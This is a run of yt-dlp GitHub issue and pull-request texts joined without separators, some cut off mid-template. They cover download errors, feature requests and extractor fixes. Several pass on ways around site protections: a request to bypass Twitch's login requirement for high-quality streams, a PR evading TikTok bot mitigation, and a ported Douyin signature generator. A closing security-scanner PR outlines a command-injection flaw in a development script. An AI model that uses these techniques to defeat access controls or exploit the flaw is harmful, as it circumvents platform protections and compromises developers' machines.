### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Region

Britain, US

### Provide a description that is worded well enough to be understood

From a British IP, yt-dlp is only finding one format (`play`), and its quality varies with each run. Additionally, sometimes the video is watermarked and has an ending card, sometimes it is not (_the latter, more often_).
From an American IP, the format list is as you would expect; multiple qualities and yt-dlp always chose the best one.

I could only find a couple videos that seemed to be affected.
1: https://www.tiktok.com/@ri77005/video/7599395202666597662
2: https://www.tiktok.com/@nguyetcan71/video/7599241357630131487

For the first video, only the nightly build would work. Sometimes had a watermark/ending card.
For the second, I tried with both nightly and master, they had the same outcomes. From close to 100 runs, this video never had a watermark/ending card.

For the first video, 2 resulted in a watermarked download. Only one of the 2 had a JS challenge.
All videos had the same download URL, so I can't see why there is a discrepancy in the qualities.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

```shell
Since the output is quite long (10 runs each), I've used pastebin. If this is not acceptable I can resubmit as normal.

Hi, 
I wanted to download a playlist from youtube and I got this error message:

```
[download] Downloading item 1 of 10

[info] s2GoHmg0YjE: Downloading 1 format(s): 248+251
ERROR: unable to download video data: HTTP Error 403: Forbidden
```
I checked the linked github page and I confirmed I have deno installed.
I updated everything:

```
brew update
brew upgrade
```
I confirmed major dependencies are installed with: 

```
which deno
which ffmpeg
which ffprobe
```

Nothing works.

The command I used and worked in the past:

```
yt-dlp -x --audio-format mp3 -P ~/Downloads/ -o ""%(title)s.%(ext)s"" ""https://www.youtube.com/playlist?list=OLAK5uy_lZYvDiLFLNmm8L2FKgoCSA5WPviQaWan4""
```

I also tried to log in on Safari to use cookies with:

```
yt-dlp --cookies-from-browser safari -x --audio-format mp3 -P ~/Downloads/knockedloose/ -o ""%(title)s.%(ext)s"" ""https://www.youtube.com/playlist?list=OLAK5uy_lZYvDiLFLNmm8L2FKgoCSA5WPviQaWan4""
```

But then I get: 
```
ERROR: [Errno 1] Operation not permitted: '/Users/username/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies'
```

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"Requesting new options `--write-traffic` and `--write-timestamp` to store traffic and last-modified(--mtime) in separate files. ### Checklist

- [x] I'm requesting a feature unrelated to a specific site
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar requests **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

Basically, it would be very useful if
`yt-dlp --write-traffic --write-timestamps --fixup warn -f 299,140 -o ""%(id)s.f%(format_id)s.%(ext)s"" -- VIDEOID`
wrote the `--print-traffic` log and `--mtime` values of f299 and f140 to 
`VIDEOID.f299.mp4-$(date -u +%Y%m%d.%H%M%S).timestamp`
`VIDEOID.f299.mp4-$(date -u +%Y%m%d.%H%M%S).traffic`
and
`VIDEOID.f140.m4a-$(date -u +%Y%m%d.%H%M%S).timestamp`
`VIDEOID.f140.m4a-$(date -u +%Y%m%d.%H%M%S).traffic`
respectively.

Why?

For provenance reasons, I prefer to archive all details. Including any ""super""-meta-details, viz. all the html pages that got served to yt-dlp, the sig YT was using at the time of crawl, protocol used during handshake, the Cipher Suites preferred by YT at the time of crawl etc.

I also use the `--print-traffic` log to `grep` for the `last-modified` header, whose value I store in a separate `.timestamp` file - `""%(id)s.f%(format_id)s.%(ext)s-$(date -u +%Y%m%d.%H%M%S).timestamp""` . This makes the file's date-modified value file-system agnostic, making it more resilient to subpar copying software that don't preserve that value, such as during cloud service based file transfers. And if the original date-modified of my local copy of the file is destroyed(due to a ""date-modified-non-preserving"" file transfer or file system corruption), then I may use that .timestamp file to re-`touch` accordingly. I maintain the file separately to ease the burden of the long term maintenance of the date-modified(`--mtime`) value of the file.
I currently do this manually, so it would be great if yt-dlp had a native option.

This feature would also allow the user to detect(in a file-system agnostic way) if a given video file has changed on the server, and download/update their copy of the video(cloud storage-d or otherwise) accordingly. I've elaborated more [in this comment.](https://github.com/yt-dlp/yt-dlp/issues/13876#issuecomment-3227750016).

Also if you choose to add this feature, please also add a `--no-write-traffic` and `--no-write-timestamp` option. Related issue - #14304

Thank you.

*I originally wanted to post this as a Youtube ""Site feature request"" but I think this could be a core feature that would be useful for all sites.*


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

TheChosen.tv has recently switched URLs for videos from `watch.thechosen.tv/video/<id>` to` watch.thechosen.tv/watch/<id>`.
This breaks the extractor matching.

PR incoming do fix this by updating the template.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

_No response_

### Provide a description that is worded well enough to be understood

Usually (at least for YouTube and BitChute) --match-filter gets checked right before the ""[download] Downloading item x of y"" line to quickly reject items, however for Odysee that doesn't happen, and thus each item gets extracted and then checked.
Apparently the problem is that in [this check](https://github.com/yt-dlp/yt-dlp/blob/e3f0d8b731b40176bcc632bf92cfe5149402b202/yt_dlp/YoutubeDL.py#L1554) `info_dict` doesn't contain `'ie_key'` and thus a `KeyError` gets thrown. For both YouTube and BitChute `'ie_key'` is in `info_dict` when they get to this check.

I noticed that while building an application that provides a function for `match_filter` for detecting when an items starts being processed (when `incomplete is True and playlist_autonumber`), as well as doing some actual filtering, and that works great for YouTube and BitChute, but it doesn't get called that early for Odysee.

I've provided the beginning of the log for both Odysee and YouTube to see the difference.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Spain

### Example URLs

https://www.youtube.com/@francoescamilla/videos

### Provide a description that is worded well enough to be understood

Some channels/playlists have a mix of content where they post interesting stuff mixed with uninteresting. It would be useful to be able to tell `yt-dlp` something like. “Only download if visualizations > 1M” or something like that.

I am putting this as `site feature request` since I guess not every supported site has a visualizations number so this would be a YT site feature, but it may or may not have been better to put it in general feature request, I don't know.

### Region

Brazil

### Provide a description that is worded well enough to be understood

The JS challenges fail when I try to download a YouTube video inside a Docker container with Node.js as the js-runtime. The node process simply terminates. I tested it outside the container, and it worked. The logs below show all the details. I also tested with Deno inside the container, and it resulted in the same problem.

Docker image: `node:24-bookworm-slim`.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"YouTube downloads stuck in infinite 403 loop due to SABR streaming when no JS runtime is available ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

When downloading certain YouTube videos or playlists without a supported JavaScript runtime, yt-dlp falls back to SABR/HLS streaming and enters an infinite retry loop due to HTTP 403 errors on fragments.

The tool prints warnings indicating that JavaScript extraction is deprecated and that SABR streaming is being forced, but it continues retrying fragments indefinitely instead of aborting or failing gracefully.

This results in:

Endless retries (Retrying fragment X (n/inf))

Empty output files

No clear terminal failure state

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Region

Italy

### Provide a description that is worded well enough to be understood

I have a python file that allows me to download things with SpotDL and YT-DLP, and they have huge arguments and lots of cookies and spotify developer keys to select randomly so i don't get blocked on all the accounts.
After the big thing spotify did after Anna's archive downloaded it all, the downloader stopped working completely.
Now i run this python file on a server, and i download it everytime i need to apply changes and i test in on my macbook or my computer, and this time, i've seen that it works when i don't specify cookies but when i do specify cookies it doesn't. i was also using Po tokens, extractor arguments, audio quality (128k), audio format was m4a etc etc. I even tried to refresh cookies for the same account, i tried using a different account i never used, i tried with a vpn and without a vpn and it seems that only when i don't specify any cookies from any account, it works. Any ideas 😬? 

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

**You can test this pull request with a pre-release build from my fork:**
https://github.com/bashonly/yt-dlp/releases/tag/tiktok

If you're using a single-file executable, you can run this command:
```
yt-dlp --update-to bashonly/yt-dlp@tiktok
```
When you're done testing, you can get back on an official update channel by running this command:
```
yt-dlp --update-to nightly@latest
```
Or, if you installed yt-dlp using pip, you can install from the PR branch like this:
```
pip install --force-reinstall ""yt-dlp[default,curl-cffi] @ git+https://github.com/bashonly/yt-dlp@fix/tiktok-challenge""

### Provide a description that is worded well enough to be understood

Until early January 2026, videos could be downloaded using the command below, but as of January 24, 2026, this is no longer possible.
The execution environment is Windows 11.
The execution browsers are Google Chrome and Firefox.
I am subscribed to the channel whose videos I attempted to download.
Videos not requiring a subscription could be downloaded.
Updating yt-dlp to Nightly, installing Node.js, and spoofing the application were all tested, but the situation remained unchanged.
It was ultimately concluded that the cause was a YouTube specification change preventing yt-dlp from decrypting the n parameter.
Therefore, it is reported that yt-dlp requires an update to its functionality for decrypting YouTube's encryption (the n challenge).



### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead

    **IMPORTANT**: PRs without the template will be CLOSED
    
    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.

### Provide a description that is worded well enough to be understood

I often use Yt-dlp to download lots of TikTok videos. However, since today, it no longer works. I get the following error message: Unable to extract webpage video data; please report this issue on....
Anyway, I hope the problem can be fixed soon.

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

Using `-o -` does not write the output of downloaded YT transcripts to the standard output. At line 1315 of the man page, it says ""To output to stdout use -o -."" but when I run the following command, the file is written to `-.en.srt`:

```
yt-dlp --write-auto-subs --skip-download --convert-subs srt -o - ""<URL>""
```

I tried to use `-o -` right after `yt-dlp` and after the URL, but the results remain the same.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Region

Türkiye

### Provide a description that is worded well enough to be understood

ERROR: [TikTok] 7573346575041269010: Unable to extract webpage video data; please report this issue on  https://github.com/yt-dlp/yt-dlp/issues?q= , filling out the appropriate issue template. Confirm you are on the latest version using  yt-dlp -U


### Checklist
- [x] I'm on the latest yt-dlp version
- [x] I've verified this issue still happens on the latest nightly
- [x] I've searched existing issues

### Description
yt-dlp is unable to extract webpage video data for certain TikTok videos. Because of this failure, subtitles/captions are reported as missing even though captions are clearly available in the TikTok mobile app. This looks like a TikTok extractor issue rather than a subtitles availability problem.

### Command used
yt-dlp --list-subs https://www.tiktok.com/@thekeytotv/video/7573346575041269010

### Expected behavior
The video webpage data should be extracted successfully and available captions (e.g. eng-US) should be detected and listed.

### Actual behavior
Extraction fails with the following error:
ERROR: [TikTok] Unable to extract webpage video data

As a result, no subtitles are detected or listed.

### yt-dlp version
yt-dlp 2026.01.19.359.dev0

### OS
Windows 10

### Additional notes
The same video has captions visible in the TikTok mobile application. The issue occurs both with and without cookies. Using --cookies-from-browser firefox does not resolve the issue. This seems to affect some TikTok videos selectively and may be related to recent changes in TikTok's webpage structure.


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Please make sure the question is worded well enough to be understood

I had a build of yt-dlp that was working and always shown me M3U8 formats to download. (I kept it up to date up to december release and it always kept showing me M3U8 formats)
One day I tried to install Deno, it removed the M3U8 from the format list, and didn't add any other, I removed Deno and I got back my M3U8 formats.
That was until I updated today to nightly, I was just trying to download a youtube video and got an error 403 (forbidden+download file is empty), so I updated to nightly.

It got the video to download but removed my M3U8 formats from the list.

I believe M3U8 formats had the best quality since they had highest bitrate, and I just saw them again on the same video before updating so they should still exist but they don't appear to me anymore.

I also believe installing again Deno would not give me M3U8 since it removed it in the past.

What do you think about it?

Japan

### Provide a description that is worded well enough to be understood

Today I download Youtube videos, it encountered 403 error. I use my Firefox cookie to download videos, I can also watch videos in Firefox. The same IP and the same video address, if I download video directly, it works good, but if I download video with cookie, it encountered 403 error.

I tried nightly version, the newest version 2026.01.19 can't recognize the video formats, I tried nightly version 2026.01.16, it encountered 403 error. Two different version outputs is above.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

A number of months ago Dropout added the upload date to video pages such as the one linked above. One slight wrinkle; they format it as such: 19-Jan-2026.

It would be great if the upload date (converted to UTC, of course) could be included for Dropout downloads so we can use --mtime and something like -o ""%(channel)s - %(upload_date>%Y-%m-%d)s - %(title)s.%(ext)s"" to add the date to downloads just as with YouTube videos.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)

### Provide a description that is worded well enough to be understood

The nightly and master builds releases is missing armv7l build, can it be added?
It's in every stable release and only master and nightly is missing it.
It would be nice if it could be added since stable version has currently issues with downloading age restricted videos on youtube, even with cookies included (checked on windows - nightly version works with no issue)

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead

"[ie/tiktok] fix TikTok downloads failing due to bot mitigation <!--
    **IMPORTANT**: PRs without the template will be CLOSED
    
    Due to the high volume of pull requests, it may be a while before your PR is reviewed.
    Please try to keep your pull request focused on a single bugfix or new feature.
    Pull requests with a vast scope and/or very large diff will take much longer to review.
    It is recommended for new contributors to stick to smaller pull requests, so you can receive much more immediate feedback as you familiarize yourself with the codebase.

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.

### Description of your *pull request* and other information

Fixes #15418

#### **Problem:**
TikTok video extraction reguarly fails with an ""Unable to extract webpage video data"" error. 

#### **Root Cause:**
TikTok's recently (~2-3 months ago) enhanced their anti-bot mitigation system. Calls to the mobile API (`api16-normal-c-useast1a.tiktokv.com`) are returning `Content-Length: 0` (empty response) due to bot mitigation, which can be confirmed by inspecting the response headers. 

When bot mitigation is triggered, TikTok now returns a `x-tt-system-error: 3` header with a minimal ~600 byte error page instead of the actual content, meaning neither `__UNIVERSAL_DATA_FOR_REHYDRATION__` nor `SIGI_STATE` JSON data can be extracted from the blocked response. As a result, it is not possible to complete the download.

#### **Solution:**
Since requests using the existing code occasionally succeed, this PR implements a resilient, multi-tier extraction system to supplement the existing approach. This PR adds:

1. **Early cookie initialisation:** Pre-initialises TikTok session cookies before extraction attempts to improve success rate
2. **""Blocked"" response detection:** Detects the `x-tt-system-error` header and minimal response sizes (<1KB) to identify blocked requests
3. **Stepped retries:** Failed requests are automatically retried (up to 3 attempts) to capture false negatives (for some reason, TikTok will return a bot mitigation/block page on the first/second request, and then the second/third request will randomly succeed 🤷‍♂️)
4. **Embed page fallback:** When main page extraction fails, we'll instead attempt extraction from `/embed/v2/{video_id}` which often succeeds where the main page is blocked. `__FRONTITY_CONNECT_STATE__` data is then extracted and video URLs from the embed response are parsed to facilitate download
5. **oEmbed API fallback:** Implemented TikTok's public oEmbed endpoint (`/oembed?url=...`) to retrieve video metadata (title, author, thumbnail) when other methods fail to ensure metadata is accurately captured and returned
6. **CDN URL extraction:** Video URLs from the embed page HTML are extracted via regex as final fallback, and filter out audio-only URLs (`audio_mpeg`, `mime_type=audio`, `/music/`), and prioritise App IDs (`a=1233`/`a=0` preferred over `a=1180`) appropriately

#### **Testing:**
Verified extraction works on multiple TikTok URLs that were previously failing, including direct URLs (`https://www.tiktok.com/@username/video/{id}`) and short URLs (`https://vt.tiktok.com/{short_id}`),

"git build broken: IPv6 SOCKS tests fail on systems without ::1 loopback ### Checklist

- [x] I'm reporting a bug unrelated to a specific site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

Many systems have IPv6 disabled because unlike IPv4 the protocol is superfluous and turning it off is the fastest and most secure way to avoid many problems, not only limited to iptables / networking interfaces, but also emulation layers, multi-protocol tunneled and soft-tunneled setups involving real or virtual machines, per-application networking permissions management / containers / jails, very very weird networking hacks to mitigate bad DSL lines, QoS and disproportionate server duplicate configuration overhead on at-home non-production environments ... amongst other things that can't be *simply* addressed any other way or with a ""just do a second this, just do a second that"". It is a dozen ""this and that"" and then it still breaks things, which is why it is better left off in the first place. Although in theory you could make some ridiculous effort to keep it on.

So please no IPv6 idealism here. 

Git build fails because of requiring a 100.00% unnecessary protocol that causes issues if activated.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

"Zee5 Error involving Login/Token Issue ### Checklist

- [x] I'm reporting that yt-dlp is broken on a **supported** site
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've checked that all provided URLs are playable in a browser with the same IP and same login details
- [x] I've checked that all URLs and arguments with special characters are [properly quoted or escaped](https://github.com/yt-dlp/yt-dlp/wiki/FAQ#video-url-contains-an-ampersand--and-im-getting-some-strange-output-1-2839-or-v-is-not-recognized-as-an-internal-or-external-command)
- [x] I've searched [known issues](https://github.com/yt-dlp/yt-dlp/issues/3766), [the FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ), and the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar issues **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated
- [ ] I've read about [sharing account credentials](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#are-you-willing-to-share-account-details-if-needed) and I'm willing to share it if required

### Region

_No response_

### Provide a description that is worded well enough to be understood

I'm prompted to provide login details, such as <mobile_number> or username/password, but it doesn't works. I'm unsure how to pass tokens though.

That's because the OTP system somehow doesn't work, like you would manually enter details on the webpage. Besides, the issue only appears to have popped up recently, as I was earlier able to download _without_ even having to login.

I tried passing --cookies but that didn't help.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

I think maybe YouTube has updated its verification rules, which has caused the situation where I could previously download normally but now I can't anymore. The process is still that I go to the Google plugin, get the cookies.txt file to obtain the cookies, and then use the command line to download.
yt-dlp -N 16 --proxy http://localhost:7897 --cookies ""D:/mv/youtube/cookies.txt"" --write-sub --sub-lang zh,en -o ""D:/mv/youtube/%(title)s-%(id)s.%(ext)s"" https://www.youtube.com/watch?v=gX4568oAoJA
Then the error started to occur. At first, I downloaded a video link from https://www.youtube.com/shorts/pnVMOz1NAqg. I thought maybe the verification had been changed.
maybe it mistake in there？ [debug] JS runtimes: none ，but i install pip install -U yt-dlp-ejs，and i hava node
I hope to address and resolve the issue of being unable to download.

### Provide a description that is worded well enough to be understood

## Problem Description

When attempting to download videos from Globoplay (https://globoplay.globo.com) on Windows 11 using the `--cookies-from-browser chrome` flag, yt-dlp fails with a DPAPI decryption error. This prevents users from downloading content that requires authentication.

The error occurs because Windows 11's Chrome implementation uses Application Bound Encryption (introduced in July 2024), which yt-dlp cannot decrypt properly on this platform.

## URLs Affected

- https://globoplay.globo.com/v/12771154/
- - https://globoplay.globo.com/agora-na-tv/
- - - https://globoplay.globo.com/bbb-26-acompanhe-a-casa/ao-vivo/244881/
## Expected Behavior

yt-dlp should be able to extract and use cookies from Chrome to authenticate with Globoplay and download videos.

## Actual Behavior

The command fails with: `AttributeError: 'NoneType' object has no attribute 'decode'`

This is a critical issue for Globoplay users on Windows 11, as the current workaround requires manual cookie export, which is not user-friendly.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

"Please add support for SponsorBlock category ""Intermission"" ### Checklist

- [x] I'm requesting a feature unrelated to a specific site
- [x] I've looked through the [README](https://github.com/yt-dlp/yt-dlp#readme)
- [x] I've verified that I have **updated yt-dlp to nightly or master** ([update instructions](https://github.com/yt-dlp/yt-dlp#update-channels))
- [x] I've searched the [bugtracker](https://github.com/yt-dlp/yt-dlp/issues?q=is%3Aissue%20-label%3Aspam%20%20) for similar requests **including closed ones**. DO NOT post duplicates
- [x] I've read the [policy against AI/LLM contributions](https://github.com/yt-dlp/yt-dlp/blob/master/CONTRIBUTING.md#automated-contributions-ai--llm-policy) and understand I may be blocked from the repository if it is violated

### Provide a description that is worded well enough to be understood

Currently the documentation says that yt-dlp supports the SponsorBlock segments of:
sponsor, intro, outro, selfpromo, preview, filler, interaction, music_offtopic, hook, poi_highlight, chapter, all

This is most of the categories. However ""Intermission"" is a category that is currently unsupported, and adding support for this category would be as useful as any of the others.

Thanks!

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

Quality options above 720p60 typically require an a login token to access. However this can be bypassed as has been done by [TwitchDownloader](https://github.com/lay295/TwitchDownloader/pull/1449).

It would be great to see this implemented into yt-dlp to allow for downloading the highest quality streams that are available.

"[ie/douyin] sign web detail requests with a_bogus ### Description of your *pull request* and other information

Fixes #9667

**Problem:**
Douyin web detail API (`/aweme/v1/web/aweme/detail/`) now requires a valid `a_bogus` signature parameter in the query string. Without it, the API returns empty JSON responses, causing the ""Fresh cookies (not necessarily logged in) are needed"" error even when valid cookies are provided via `--cookies-from-browser` or `--cookies`.

**Root Cause:**
The `DouyinIE` extractor was only sending `aweme_id` in the query parameters, missing the required `a_bogus` signature and other device/platform parameters that Douyin's API expects.

**Solution:**
This PR adds:
1. A minimal `a_bogus` signature generator (`yt_dlp/extractor/douyin_signatures.py`) ported from [Douyin_TikTok_Download_API](https://github.com/Evil0ctal/Douyin_TikTok_Download_API) (Apache 2.0 licensed, compatible with Unlicense)
2. Updates `DouyinIE._real_extract()` to include:
   - Required query parameters (device_platform, aid, channel, etc.)
   - Generated `a_bogus` signature
   - Proper headers (User-Agent, Referer)

The implementation uses the internal SM3 hash function already present in the `ABogus` class, avoiding external dependencies like `gmssl` or `Cryptodome`.

**Testing:**
Verified with `--cookies-from-browser edge` on multiple Douyin video URLs. The extractor now successfully retrieves video metadata that was previously failing with ""Fresh cookies needed"" error.

**Code License:**
The `douyin_signatures.py` implementation is ported from [Douyin_TikTok_Download_API](https://github.com/Evil0ctal/Douyin_TikTok_Download_API) which is licensed under Apache 2.0. Apache 2.0 is compatible with Unlicense for inclusion in yt-dlp as it allows relicensing to public domain/Unlicense.

### Description of your *pull request* and other information

Fixes a core bug:
to reproduce: `echo -ne 'bv+ba\ny\n' | python -m yt_dlp -v -f- --match-filters - -o- ytsearch:NeverGonna | mpv -`
When downloading to stdout, `-f-` or `--match-filters -` uses `input()` to prompt the user. Since `input()` writes the prompt to stdout, mpv will receive a corrupted video file with the prompt at the beginning. And the user won't be able to see the prompt. This PR fixes it by using `YoutubeDL.to_screen` to print the prompt.

"[Security] Fix CRITICAL vulnerability: V-004 ## Security Fix

This PR addresses a **CRITICAL** severity vulnerability detected by our security scanner.

### Security Impact Assessment

| Aspect | Rating | Rationale |
|--------|--------|-----------|
| Impact | High | In the yt-dlp repository, exploitation of this vulnerability in devscripts/install_deps.py could allow arbitrary code execution on a developer's machine during dependency installation, potentially compromising their local environment and any connected systems or credentials. As yt-dlp is a widely-used command-line tool for video downloading, a compromised developer could inadvertently introduce malware into future releases or leak sensitive project data. However, this does not directly affect end-users running the released yt-dlp binary, limiting the scope to development workflows. |
| Likelihood | Low | The vulnerability resides in a development script not included in the released yt-dlp tool, so it requires an attacker to trick a developer into executing the script with malicious command-line arguments, such as through social engineering or supply chain attacks on the repository. Given yt-dlp's open-source nature and typical usage as a standalone CLI tool by end-users, there is minimal attack surface for remote exploitation, and developers are unlikely to pass untrusted inputs to internal scripts without verification. |
| Ease of Fix | Easy | Remediation involves refactoring the shell command construction in install_deps.py to use safe methods like subprocess with argument lists instead of string concatenation, requiring minimal code changes and no dependency updates. This fix can be implemented quickly with low risk of breaking existing functionality, as it's isolated to a development script not affecting the core yt-dlp tool. |

### Evidence: Proof-of-Concept Exploitation Demo

**⚠️ For Educational/Security Awareness Only**

This demonstration shows how the vulnerability could be exploited to help you understand its severity and prioritize remediation.

#### How This Vulnerability Can Be Exploited

The devscripts/install_deps.py file in yt-dlp accepts command-line arguments for dependency installation and uses them to construct shell commands via string concatenation without sanitization, enabling command injection. An attacker could exploit this by passing malicious arguments to the script, executing arbitrary commands on the system where the script runs, such as a developer's local machine or a CI environment. This is particularly feasible if the script is run during repository setup or build processes, potentially through social engineering or compromised CI pipelines.

